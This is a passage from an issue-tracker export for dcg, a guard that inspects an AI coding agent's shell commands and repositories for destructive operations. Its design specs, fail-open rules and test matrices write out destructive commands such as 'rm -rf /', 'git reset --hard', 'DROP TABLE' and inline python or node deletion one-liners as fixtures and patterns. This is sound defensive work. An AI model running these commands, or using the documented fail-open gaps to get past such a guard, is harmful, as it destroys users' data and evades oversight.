pass.","dependencies":[{"issue_id":"git_safety_guard-mcf","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:35:39.990890431-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mcf","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:35:40.010899112-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mcf","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:25.768100887-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-mvh","title":"Define Ruby destructive patterns for heredoc scanning","description":"## Objective\n\nDefine AST-aware matchers for destructive operations in Ruby heredoc bodies, focusing on high-signal runtime behavior.\n\n## Scope boundary\n\n- Focus on destructive filesystem/process operations.\n- Avoid broad “metaprogramming danger” patterns (e.g., `eval`) as default denies; they are common and not necessarily destructive.\n\n## Pattern families (v1)\n\n### 1) Filesystem deletion (high signal)\n\n- `FileUtils.rm_rf(path)` / `FileUtils.remove_dir(path, true)`\n- `File.delete(path)` / `File.unlink(path)`\n\nSeverity guidance:\n\n- `Error` only for catastrophic literal targets.\n- Otherwise default `Warning`.\n\n### 2) Process execution with destructive payload (high signal)\n\n- backticks with literal destructive payload: `` `rm -rf ...` ``\n- `system(\"rm -rf ...\")`\n- `exec(\"git reset --hard ...\")`\n\nImportant:\n\n- Do not flag `system($VAR)` as deny; too broad. At most warn if combined with other signals.\n\n## Testing requirements\n\n- Positive fixtures for:\n  - `FileUtils.rm_rf(\"/\")` (catastrophic)\n  - `system(\"rm -rf /\")`\n- Negative fixtures for:\n  - `FileUtils.rm_rf(\"./tmp\")` (warning at most)\n  - `puts \"rm -rf\"`\n\n## Acceptance Criteria\n\n- Defines a Ruby pattern set aligned with severity taxonomy and focused on irreversible operations.\n- Includes at least 5 positive and 5 negative fixtures.\n- No default hard denies unless clearly catastrophic.\n","notes":"CrimsonFalcon: taking over to align severity (catastrophic literal path blocks; otherwise warn) + add missing JS/Ruby positive/negative fixtures; will run full gates and push.","status":"closed","priority":2,"issue_type":"task","assignee":"CrimsonFalcon","created_at":"2026-01-07T18:37:18.506057604-05:00","created_by":"ubuntu","updated_at":"2026-01-08T10:21:41.941491999-05:00","closed_at":"2026-01-08T10:21:41.941491999-05:00","close_reason":"Implemented patterns + 5+ positive/negative test fixtures. All tests pass.","dependencies":[{"issue_id":"git_safety_guard-mvh","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:35.430025823-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mvh","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:35.449812115-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mvh","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:30.957434297-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-o15","title":"Design heredoc detection strategy","description":"# Design: Heredoc + Inline-Script Detection Strategy (Tiered)\n\n## Objective\nDesign a **robust and performant** strategy to detect heredocs and inline-script constructs embedded inside a single shell command string (Claude Code `PreToolUse` Bash hook), so we can scan embedded code for destructive behavior *without* creating velocity-destroying false positives.\n\nThis spec is intended to be **implementation-ready** and self-contained.\n\n---\n\n## Terminology\n\n- **Command string**: The exact `tool_input.command` string received by the hook. May contain newlines.\n- **Heredoc**: Any `\u003c\u003c`, `\u003c\u003c-`, `\u003c\u003c~` form that introduces a delimiter-terminated literal block.\n- **Here-string**: `\u003c\u003c\u003c` form that introduces an inline string (single token / quoted string).\n- **Inline-script flags**: `-c`, `-e`, etc. flags to interpreters that embed code directly in arguments.\n- **Tier 0**: Existing pack-aware keyword gate (`pack_aware_quick_reject`).\n- **Tier 1**: Microsecond-level trigger detection (RegexSet/fast scan). Must have **near-zero false negatives** for the forms we claim to support.\n- **Tier 2**: Bounded extraction of embedded code payloads (delimiter-aware), with hard caps.\n- **Tier 3**: Language-aware scanning of extracted payload (AST/pattern matching) under strict time budgets; **fail-open** on error/timeout in hook mode.\n\n---\n\n## Design Principles\n\n1. **Fail-open for parser/timeouts in hook mode**: if heredoc extraction or AST scanning fails/timeout, allow the command and emit diagnostic markers (for `dcg explain` / logs).\n2. **Tiered cost model**: Tier 1 should be *cheap enough to run on every command*; Tier 2/3 only run when Tier 1 triggers.\n3. **False-positive immunity is a first-class goal**:\n   - Tier 1 may be permissive (false positives OK) as long as downstream tiers quickly bail.\n   - Tier 2/3 must minimize false positives by focusing on *executed code context*.\n4. **Multiple embedded scripts must be supported** (multiple heredocs, or heredoc + `python -c`, etc.) with bounded total work.\n\n---\n\n## Scope: What We Support in v1\n\n### A) Heredocs (Bash/POSIX-ish)\nSupported operators:\n- `\u003c\u003c DELIM`\n- `\u003c\u003c'DELIM'` / `\u003c\u003c\"DELIM\"` (quoted delimiter)\n- `\u003c\u003c- DELIM` (tab-stripping)\n- `\u003c\u003c~ DELIM` (zsh indentation-stripping) **treated as supported trigger**, but extraction semantics may start as `\u003c\u003c-` equivalent (see below).\n\nSupported delimiter tokens:\n- unquoted: `EOF`, `__SQL__`, `END`, `DELIM123` (shell token without whitespace)\n- quoted: `'EOF'`, `\"EOF\"`, `'$DELIM'` (we still treat the delimiter token as the literal inside quotes)\n\nSupported layouts:\n- heredoc on same line: `cat \u003c\u003cEOF\\n...\\nEOF`\n- heredoc with pipes/redirections after: `cat \u003c\u003cEOF | sed ...`\n- multiple heredocs in a single command string.\n\n### B) Here-strings\n- `\u003c\u003c\u003c \"string\"` / `\u003c\u003c\u003c 'string'` / `\u003c\u003c\u003c $VAR` (we treat the token value textually; we do not expand variables)\n\n### C) Inline scripts (not heredocs, but embedded code)\nWe treat these as “embedded payloads” too.\n\nSupported interpreter patterns (command prefix mapping defined in `git_safety_guard-jfj`):\n- `bash -c \u003ccode\u003e` / `sh -c \u003ccode\u003e` / `zsh -c \u003ccode\u003e`\n- `python -c \u003ccode\u003e` / `python3 -c \u003ccode\u003e`\n- `node -e \u003ccode\u003e` / `node -p \u003cexpr\u003e`\n- `ruby -e \u003ccode\u003e`\n- `perl -e \u003ccode\u003e`\n\nNotes:\n- We do **not** attempt full shell parsing for all argument edge cases in v1; we do bounded heuristics that are correct for the common forms.\n\n---\n\n## Explicitly Out-of-Scope for v1 (Fail-Open + Diagnostic)\n\nIf Tier 1 triggers but extraction cannot confidently produce payload(s), we **fail-open** and attach a reason marker.\n\nOut-of-scope cases:\n- Fish shell heredoc syntax (different model)\n- Heredocs inside complex nested command substitutions where token boundaries are ambiguous without a full shell parser\n- Extremely exotic delimiter rules (e.g., delimiters requiring full shell expansion semantics)\n\n---\n\n## Tier 1: Trigger Detection (Fast, Safe)\n\n### Goal\nReturn “maybe contains embedded payload” with **high recall** and very low overhead.\n\n### Triggers (recommended)\nImplement as `RegexSet` / `memchr`-gated regexes (see `git_safety_guard-t1rx`). Trigger if any of:\n\n1) Heredoc operators (outside the trivial false-positive cases):\n- `\u003c\u003c` (including `\u003c\u003c-`, `\u003c\u003c~`)\n- `\u003c\u003c\u003c`\n\n2) Inline-script flags (coarse):\n- `\\b(?:bash|sh|zsh)\\b[^\\n]*\\s-\\s*c\\b` (approx)\n- `\\bpython\\d*\\b[^\\n]*\\s-\\s*c\\b`\n- `\\bnode(?:js)?\\b[^\\n]*\\s-(?:e|p)\\b`\n- `\\bruby\\b[^\\n]*\\s-\\s*e\\b`\n- `\\bperl\\b[^\\n]*\\s-\\s*e\\b`\n\n### Tier 1 false-positive policy\nTier 1 is allowed to trigger on:\n- `echo \"\u003c\u003c\"`\n- `printf '\u003c\u003c\u003c'`\n\n…but Tier 2 must cheaply reject when the operator is inside quotes / not a real heredoc.\n\n---\n\n## Tier 2: Extraction (Delimiter-Aware, Bounded)\n\n### Goal\nExtract a list of payloads:\n- `HeredocPayload { operator, delimiter, quoted_delimiter, strip_mode, content_range, content_preview }`\n- `HereStringPayload { token_range, token_text }`\n- `InlineArgPayload { interpreter, flag, arg_range, arg_text }`\n\n### Hard Limits (defaults; configurable later)\n- `MAX_PAYLOADS_PER_COMMAND`: 4 (fail-open + diagnostic if exceeded)\n- `MAX_TOTAL_EXTRACT_BYTES`: 64 KiB across all payloads\n- `MAX_SINGLE_PAYLOAD_BYTES`: 32 KiB\n- `MAX_LINES_PER_PAYLOAD`: 2,000\n\n### Extraction Algorithm (heredoc)\nWe need a linear scan that approximates shell tokenization enough to identify real `\u003c\u003c` operators.\n\n#### State machine (minimum viable)\nTrack:\n- `in_single_quote` (`'...'`)\n- `in_double_quote` (`\"...\"`)\n- `in_backtick` (`` `...` ``) (optional v1)\n- `escaped` (backslash escape outside single quotes)\n\nRule: A `\u003c\u003c` or `\u003c\u003c\u003c` is only considered an operator when **not in any quote state**.\n\n#### Parsing delimiter token\nWhen `\u003c\u003c`/`\u003c\u003c-`/`\u003c\u003c~` found:\n1. Determine strip mode:\n   - `\u003c\u003c-` → `StripTabs`\n   - `\u003c\u003c~` → `StripIndent` (treat as `StripTabs` in v1 if needed; record true mode for future)\n   - `\u003c\u003c` → `NoStrip`\n2. Skip whitespace.\n3. Read delimiter token:\n   - If next char is `'` or `\"`, read until matching quote; delimiter = inner bytes.\n   - Else read until whitespace or one of `|\u0026;()\u003c\u003e` (shell-ish token boundary).\n4. Record delimiter.\n\n#### Finding delimiter terminator line\nAfter locating delimiter token, the heredoc content begins **after the next newline**.\n\nTo find terminator:\n- Scan subsequent lines.\n- A terminator line matches when (after applying strip semantics to the terminator line only):\n  - `line == delimiter` OR `line == delimiter + \"\\r\"` (handle CRLF)\n\nIf not found within caps → fail-open + diagnostic `heredoc_terminator_not_found`.\n\n#### Strip semantics\n- `NoStrip`: keep content as-is.\n- `StripTabs` (`\u003c\u003c-`): remove **leading tab characters** from each content line and from the terminator line check.\n- `StripIndent` (`\u003c\u003c~`): v1 option:\n  - implement as `StripTabs` initially (conservative), OR\n  - remove leading tabs+spaces uniformly up to the minimum indentation across non-empty lines.\n\n### Extraction Algorithm (here-string)\nWhen `\u003c\u003c\u003c` found outside quotes:\n- Capture the remainder token following `\u003c\u003c\u003c` up to newline/`;`/`|` boundary.\n- For v1, do not expand `$VAR`; treat it as literal text.\n- Provide payload text as the token substring (bounded to `MAX_SINGLE_PAYLOAD_BYTES`).\n\n### Extraction Algorithm (inline-script args)\nThis is a separate path that does not require heredoc delimiters.\n\nApproach:\n- Perform a lightweight token split on the first line only (up to a cap, e.g. 4 KiB).\n- Identify interpreter command name (token 0 or after `sudo`/env assignments).\n- Identify `-c` / `-e` / `-p` flags and capture the following argument token as payload.\n\nIf tokenization is ambiguous (unclosed quotes, etc) → fail-open + diagnostic `inline_script_tokenize_failed`.\n\n---\n\n## Tier 3: Downstream scanning handshake (interface only)\n\nTier 2 yields payloads; Tier 3 consumes payloads.\n\nTier 3 must:\n- run only when payload exists\n- be time-bounded (configurable; default 25ms total)\n- be size-bounded (Tier 2 caps)\n- fail-open on timeout/error in hook mode\n\nThe Tier 3 integration point is `git_safety_guard-e7m` (blocked). This spec defines how Tier 2 feeds Tier 3.\n\n---\n\n## Diagnostics / Explainability\n\nTier 2 must be able to emit structured diagnostics for later explain mode:\n- `triggered: bool`\n- `payload_count`\n- `fail_open_reason` (enum)\n- `bytes_scanned`\n- `timeouts`\n\nExamples:\n- `fail_open_reason=heredoc_terminator_not_found`\n- `fail_open_reason=payload_too_large`\n- `fail_open_reason=inline_script_tokenize_failed`\n\n---\n\n## Test Matrix (minimum)\n\n### Positive detection + extraction\n1. `cat \u003c\u003cEOF\\nrm -rf /\\nEOF` → 1 heredoc payload, delimiter `EOF`.\n2. `cat \u003c\u003c'EOF'\\nrm -rf /\\nEOF` → quoted delimiter.\n3. `cat \u003c\u003c-EOF\\n\\trm -rf /\\n\\tEOF` → StripTabs semantics.\n4. `cat \u003c\u003c~EOF\\n  rm -rf /\\n  EOF` → StripIndent recorded (v1 may treat like tabs; still extract).\n5. `cat \u003c\u003c\u003c \"rm -rf /\"` → here-string payload.\n6. `python -c \"import os; os.system('rm -rf /')\"` → inline payload.\n7. `node -e \"require('fs').rmSync('/')\"` → inline payload.\n\n### Multiple payloads\n8. `cat \u003c\u003cA\\nrm -rf /\\nA; cat \u003c\u003cB\\nDROP TABLE x;\\nB` → 2 payloads.\n\n### Negative / false-positive suppression\n9. `echo \"\u003c\u003cEOF\"` → Tier 1 triggers, Tier 2 rejects operator-inside-quotes (no payloads), overall allow.\n10. `printf '\u003c\u003c\u003c not real'` → same.\n\n### Edge / fail-open diagnostics\n11. `cat \u003c\u003cEOF\\nrm -rf /\\n` (missing terminator) → fail-open + diagnostic.\n12. `cat \u003c\u003cEOF\\n\u003cvery large\u003e\\nEOF` exceeding cap → fail-open + diagnostic.\n\n---\n\n## Implementation Notes / Dependencies\n\n- Tier 1: `git_safety_guard-t1rx` (RegexSet trigger)\n- Extraction: `git_safety_guard-y4j` (content extraction)\n- Language selection: `git_safety_guard-jfj` (spec) → `git_safety_guard-du4` (impl)\n- AST scanning: `git_safety_guard-yza` epic (ast-grep-core integration)\n\n---\n\n## Acceptance Criteria Checklist\n- [ ] Tier 1 triggers explicitly enumerated.\n- [ ] Tier 2 extraction algorithm specified with quote-state handling and delimiter parsing.\n- [ ] Explicit caps/timeouts + fail-open behavior defined.\n- [ ] Clear out-of-scope list with diagnostic strategy.\n- [ ] Test matrix includes positive, negative, and fail-open cases.\n","status":"closed","priority":1,"issue_type":"task","assignee":"ubuntu","created_at":"2026-01-07T18:29:15.526903078-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:16:20.011458807-05:00","closed_at":"2026-01-08T00:16:20.011458807-05:00","close_reason":"Added implementation-ready Tier0-3 heredoc/inline-script detection spec with explicit supported forms, extraction algorithm, caps/timeouts, fail-open diagnostics, and a concrete test matrix.","dependencies":[{"issue_id":"git_safety_guard-o15","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:29:24.626856626-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-o15","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:29.239192776-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-p9e","title":"Implement Terraform extractor (provisioners)","description":"## Objective\n\nImplement an extractor for Terraform files to detect executable provisioner contexts.\n\n## File Pattern\n\n- `*.tf`\n\n## Extraction Targets\n\n### Provisioner Blocks (executed)\n- `local-exec` command\n- `remote-exec` inline commands\n- `null_resource` provisioners\n\n### NOT Extracted (data only)\n- Variable definitions\n- Output values\n- Resource attributes (non-provisioner)\n- Comments\n\n## Example\n\n```hcl\nresource \"null_resource\" \"cleanup\" {\n  provisioner \"local-exec\" {\n    command = \"rm -rf /tmp/*\"  # EXTRACT THIS\n  }\n}\n\nvariable \"dangerous\" {\n  default = \"rm -rf /\"  # DO NOT extract\n}\n```\n\n## Acceptance Criteria\n\n- Correctly extracts provisioner commands with line numbers\n- Handles HCL2 syntax (Terraform 0.12+)\n- Ignores non-executable blocks\n- Unit tests with representative fixtures","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Extract only from truly executed shell contexts (e.g., `local-exec`, `remote-exec`), not from:\n  - documentation strings\n  - variable defaults\n- Negative fixtures must include data-only mentions of destructive commands.","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T21:24:57.275380054-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:30:43.267980321-05:00","dependencies":[{"issue_id":"git_safety_guard-p9e","depends_on_id":"git_safety_guard-scan","type":"blocks","created_at":"2026-01-07T21:25:20.549018763-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-p9e","depends_on_id":"git_safety_guard-scan.6","type":"parent-child","created_at":"2026-01-07T21:46:12.516806682-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-perf","title":"Implement performance benchmarks for heredoc detection","description":"# Performance Benchmark Suite\n\n## Objective\n\nCreate benchmarks to measure and enforce performance budgets for heredoc detection.\n\n## Performance Budgets\n\n| Operation | Budget | Panic Threshold |\n|-----------|--------|----------------|\n| Tier 1 regex check | \u003c 10μs | \u003e 100μs |\n| Heredoc extraction | \u003c 500μs | \u003e 2ms |\n| Language detection | \u003c 50μs | \u003e 200μs |\n| AST parsing (small) | \u003c 2ms | \u003e 10ms |\n| AST parsing (large) | \u003c 10ms | \u003e 50ms |\n| Full pipeline | \u003c 15ms | \u003e 50ms |\n\n## Benchmark Implementation\n\nUsing criterion for statistical benchmarks:\n\n```rust\n// benches/heredoc_perf.rs\nuse criterion::{criterion_group, criterion_main, Criterion, BenchmarkId};\n\nfn bench_tier1_regex(c: \u0026mut Criterion) {\n    let cases = [\n        (\"simple\", \"git status\"),\n        (\"heredoc_marker\", \"python3 \u003c\u003c 'EOF'\\nprint('hi')\\nEOF\"),\n        (\"inline_script\", \"bash -c 'echo hello'\"),\n        (\"long_command\", \u0026\"x\".repeat(10000)),\n    ];\n\n    let mut group = c.benchmark_group(\"tier1_regex\");\n    for (name, cmd) in cases {\n        group.bench_with_input(\n            BenchmarkId::new(\"might_contain_heredoc\", name),\n            cmd,\n            |b, cmd| b.iter(|| might_contain_heredoc(cmd)),\n        );\n    }\n    group.finish();\n}\n\nfn bench_full_pipeline(c: \u0026mut Criterion) {\n    // Benchmark complete heredoc check flow\n}\n\ncriterion_group!(benches, bench_tier1_regex, bench_full_pipeline);\ncriterion_main!(benches);\n```\n\n## Cargo.toml Addition\n\n```toml\n[[bench]]\nname = \"heredoc_perf\"\nharness = false\n\n[dev-dependencies]\ncriterion = \"0.5\"\n```\n\n## CI Integration\n\nAdd to CI pipeline:\n\n```yaml\n- name: Run benchmarks\n  run: cargo bench --bench heredoc_perf -- --noplot\n```\n\n## Regression Detection\n\nStore baseline and compare:\n\n```bash\n# Save baseline\ncargo bench --bench heredoc_perf -- --save-baseline main\n\n# Compare against baseline\ncargo bench --bench heredoc_perf -- --baseline main\n```\n\n## Test Data\n\nCreate fixtures:\n\n- `benches/fixtures/small_heredoc.txt` (10 lines)\n- `benches/fixtures/medium_heredoc.txt` (100 lines)\n- `benches/fixtures/large_heredoc.txt` (1000 lines)\n- `benches/fixtures/real_world_samples/` (actual heredocs from the wild)\n\n## Acceptance Criteria\n\n- Benchmarks exist for Tier 1 trigger, extraction, and at least one AST match path.\n- A baseline is established and CI can detect meaningful regressions (thresholds documented).\n- Benchmarks are deterministic enough to be useful (noise handled via criterion baselines).\n- Fixture sizes cover small/medium/large and include at least one “worst-case” style input.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:10:29.759883484-05:00","dependencies":[{"issue_id":"git_safety_guard-perf","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.686523631-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-perf","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:36.112439466-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-phpp","title":"Define PHP destructive patterns for heredoc scanning","description":"# PHP Destructive Patterns for Heredoc Scanning\n\n## Objective\n\nDefine PHP heredoc matchers focused on **irreversible operations** (filesystem deletion and literal destructive shell payloads), while minimizing false positives.\n\n## Scope boundary\n\n- Focus on destructive outcomes.\n- Do not include broad “dynamic code execution” patterns (`eval`, dynamic include) as default denies; too common and not necessarily destructive.\n\n## Pattern families (v1)\n\n### 1) Shell execution with destructive payload (high signal)\n\n- `system(\"rm -rf ...\")` / `` `rm -rf ...` `` (literal)\n- `exec(\"git reset --hard ...\")` (literal)\n\n### 2) Recursive / high-risk filesystem operations\n\n- custom recursive delete helpers are hard to statically detect; start with high-signal built-ins:\n  - `unlink($path)` / `rmdir($path)`\n\nSeverity guidance:\n\n- `Error` only when `$path` is a clearly catastrophic literal target.\n- Otherwise `Warning`.\n\n### 3) Obvious destructive SQL literals (optional)\n\nIf we can match literal `DROP` / `TRUNCATE` strings passed to `query/exec`, tag as `Warning` by default.\n\n## False positive mitigation\n\n- Do not flag `exec($VAR)` as deny.\n- Require negative fixtures for:\n  - harmless use of `exec` (e.g., `exec(\"php -v\")`)\n  - code printing dangerous strings\n\n## Acceptance Criteria\n\n- Defines a PHP pattern set aligned with severity taxonomy and focused on destructive outcomes.\n- Includes at least 5 positive and 5 negative fixtures.\n- No default hard denies unless the matched operation is clearly catastrophic.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:07:34.090458254-05:00","dependencies":[{"issue_id":"git_safety_guard-phpp","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T19:46:46.424057305-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-phpp","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:52:01.795976467-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-rbst","title":"Implement robustness and edge case handling for heredoc parsing","description":"# Robustness and Edge Case Handling for Heredoc/Inline Script Analysis\n\n## Objective\n\nEnsure heredoc detection + extraction + AST matching are *robust by construction*:\n\n- never panic\n- never hang\n- never allocate unbounded memory\n- fail-open on malformed input/timeouts (hook safety)\n\nThis task focuses on **edge cases** and **hardening** (the stuff that only shows up in the wild).\n\n## Background\n\nHeredoc and inline-script analysis is the highest-risk path for stability because inputs are:\n\n- multiline\n- potentially huge\n- often malformed (especially from agents)\n- can include confusing quoting/indentation variants\n\nA single crash/hang in this path makes users disable dcg.\n\n## Hardening requirements (v1)\n\n### 1) Size limits (must be enforced)\n\n- enforce a max extracted body size and max line count\n- limits must be configurable (see global limit work) and *never* exceed sane defaults\n\nBehavior:\n\n- if limits are exceeded: **skip deep analysis** and fail-open\n- record a structured log/event when this happens (so it is debuggable)\n\n### 2) Deadline / timeout protection (must be enforced)\n\n- tier 2 extraction must be bounded\n- tier 3 AST parsing/matching must be bounded\n- if using external processes (ast-grep), they must have a hard timeout + kill\n\nBehavior:\n\n- on timeout: skip deep analysis, fail-open, log `skipped_due_to_budget`\n\n### 3) Malformed heredoc handling (must be graceful)\n\nHandle without panic:\n\n- missing delimiter\n- unterminated heredoc\n- invalid delimiter tokens\n- invalid indentation stripping cases (`\u003c\u003c-`)\n- multiple heredocs in a single command\n\n### 4) Non-UTF8 / binary-ish content (must be safe)\n\n- detect binary-like payloads (null bytes, high non-printable ratio)\n- do not feed binary-ish input into AST parsing\n\nBehavior:\n\n- skip analysis and fail-open; log `skipped_binary_content`\n\n### 5) Multiple heredocs / nested triggers (bounded)\n\n- support multiple heredocs per command up to a small cap\n- if nested heredoc triggers appear inside a body:\n  - treat as **low-confidence** signal initially (WARN/log), not auto-DENY\n  - avoid recursion in v1; recursion can be a separate follow-up if needed\n\n## Observability requirements\n\nWhen deep analysis is skipped, the system must surface why (in trace/log):\n\n- exceeded size limits\n- deadline/budget exceeded\n- parse error / malformed input\n- binary-ish content detected\n\n## Acceptance criteria\n\n- No panics for arbitrary inputs (validated via fuzz/proptest targets).\n- Extraction and analysis never exceed configured limits/budgets.\n- Skips are visible in `dcg explain` and structured logs.\n- Multiple heredocs are handled up to the configured cap.\n\n## Tests\n\n- Unit tests:\n  - oversized heredoc → skip + fail-open + trace/log marker\n  - unterminated heredoc → skip + fail-open\n  - binary-ish heredoc → skip + fail-open\n  - multiple heredocs parsed up to cap\n\n- Fuzzing:\n  - heredoc extraction fuzz target must find no panics\n\n## Dependencies\n\n- `git_safety_guard-99e.10` global size limits (single source of truth)\n- `git_safety_guard-99e.14` evaluation time budget/deadline semantics\n- `git_safety_guard-y4j` extraction implementation\n- `git_safety_guard-tlog` logging/trace integration for heredoc path\n","status":"closed","priority":1,"issue_type":"task","assignee":"SunnyMill","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-08T02:00:11.048164731-05:00","closed_at":"2026-01-08T02:00:11.048164731-05:00","close_reason":"Implemented: size limits, binary detection, malformed input handling, multiple heredoc bounds, SkipReason observability. All 257 tests pass. Timeout enforcement deferred until Tier 3 AST matching. Fuzz targets tracked separately.","dependencies":[{"issue_id":"git_safety_guard-rbst","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T19:46:02.228572246-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-rbst","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:47:10.592550683-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-rbst","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:34.385023947-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan","title":"Epic: Repo scanning + integrations (pre-commit/CI)","description":"# Epic: Repo scanning + integrations (pre-commit/CI)\n\n## Why this epic exists\n\nThe hook protects *interactive* command execution, but teams also need protection against destructive commands that get **committed into repositories**:\n\n- CI workflows (`run:` steps) that include dangerous commands\n- Dockerfiles (`RUN`) that include irreversible operations\n- shell scripts and Makefiles that do destructive cleanup\n- Terraform provisioners that run destructive shell\n\nCatching these in review (pre-commit/CI) prevents incidents and makes `dcg` feel like a serious, team-scale safety layer.\n\nCrucially, this must be done **without creating new false positives** that annoy users at org scale.\n\n## Goals\n\n1. Implement `dcg scan` that extracts **executable command contexts** from files and evaluates them using the **same shared evaluator** as hook/CLI.\n2. Provide pre-commit and CI workflows that are \"warn-first\" and configurable (`--fail-on error|warning|none`).\n3. Produce high-quality, actionable output:\n   - stable rule IDs (`pack_id:pattern_name`)\n   - file:line[:col] locations\n   - short reason + optional suggestion\n4. Keep performance bounded:\n   - scan only changed files by default in CI\n   - cap file size and number of findings\n\n## Non-goals (initially)\n\n- Building a full static-analysis engine for arbitrary languages.\n- Grepping entire repos by default.\n\n## Safety constraints\n\n- Scanners must be extractor-based, not naive substring grep.\n- Scanner output must make it obvious what is **executed** vs **documentation**.\n- Default behavior should be conservative (warn-first rollout), with hard-fail only for high-confidence catastrophic rules.\n\n## Success Criteria\n\n- `dcg scan --staged` works locally and reports actionable findings.\n- A minimal GitHub Actions workflow can run `dcg scan` on PR diffs and surface results.\n- Unit tests cover extractor correctness for all MVP file types.\n","status":"open","priority":2,"issue_type":"epic","created_at":"2026-01-07T20:47:37.075199813-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:51:37.248909099-05:00"}
{"id":"git_safety_guard-scan.1","title":"Design: dcg scan extraction model + output schema","description":"## Objective\n\nDefine the extraction model, CLI surface area, and output schema for `dcg scan` so implementation is coherent and testable.\n\n## Background\n\nRepo scanning is where false positives can explode:\n\n- YAML contains lots of strings; only some are executed.\n- Dockerfiles have multiple instruction forms; only some invoke a shell.\n- Makefiles have recipes, variables, and docs.\n\nIf we design output + extraction boundaries up front, we can be conservative and predictable.\n\n## Proposed `dcg scan` UX (v1)\n\n### Commands\n\n- `dcg scan --staged`\n- `dcg scan --paths \u003cpath\u003e...`\n- `dcg scan --git-diff \u003crev-range\u003e` (CI/PR default)\n\n### Output\n\n- `--format pretty|json`\n- Findings include:\n  - `file`, `line`, optional `col`\n  - `extractor_id` (e.g., `github-actions.run`, `dockerfile.run`)\n  - `extracted_command` (possibly truncated/redacted)\n  - `decision` (allow|warn|deny)\n  - `severity` (info|warning|error)\n  - `rule_id` (`pack_id:pattern_name`) when matched\n  - `reason`\n  - optional `suggestion`\n\n### Policy knobs\n\n- `--fail-on error|warning|none`\n- `--max-file-size` (default 1MB)\n- `--max-findings` (default 50)\n- `--exclude` glob patterns\n- `--redact` / truncation controls\n\n## Extraction contract\n\nEach extractor returns a list of `ExtractedCommand`:\n\n- `{ file, line, col?, kind, command, metadata }`\n- `kind` identifies an *execution context* (not a doc string).\n\nThis is intentionally the same philosophy as the execution-context classifier for command lines:\n\n- Be explicit about what is executed.\n- Everything else is data.\n\n## MVP file types (must be covered)\n\n- `.sh` (shell script)\n- `Dockerfile` (`RUN` shell form)\n- GitHub Actions workflow YAML (`steps[].run`)\n- `Makefile` recipe lines\n\n## Acceptance criteria\n\n- Output schema is stable enough to write golden tests.\n- Extractor boundaries are conservative and clearly documented.\n- Design maps cleanly to a small set of Rust structs/enums.\n","notes":"## Review Additions (2026-01-08)\n\n### Determinism\n- Extraction output and scan JSON output must be deterministic:\n  - stable file ordering\n  - stable finding ordering (severity → rule_id → file:line)\n  - stable truncation/redaction rules\nThis is required for CI diffs and PR comments to be stable and non-noisy.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:48:32.372701532-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:26:38.937198812-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.1","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:55:45.283494893-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2","title":"Implement dcg scan CLI + file selection","description":"## Objective\n\nImplement the `dcg scan` CLI surface area and file-selection logic.\n\nThis task is about:\n\n- parsing args (`--staged`, `--paths`, `--git-diff`)\n- selecting candidate files safely and predictably\n- calling extractors and aggregating findings\n\nIt is *not* about the detailed extractors themselves (that is a separate task).\n\n## Requirements\n\n### CLI\n\n- Add a `scan` subcommand with:\n  - `--staged` (scan the git index)\n  - `--paths \u003cpaths...\u003e` (scan explicit paths)\n  - `--git-diff \u003crev-range\u003e` (scan files changed in a diff)\n  - `--format pretty|json`\n  - `--fail-on error|warning|none`\n  - `--max-file-size`, `--max-findings`, `--exclude`, `--redact`\n\n### File selection rules\n\n- `--staged` should use `git diff --cached --name-only` (no content parsing via shell; prefer libgit2/gix later if we want).\n- `--git-diff` should use `git diff --name-only \u003crev-range\u003e`.\n- Paths should be filtered by:\n  - file size cap\n  - 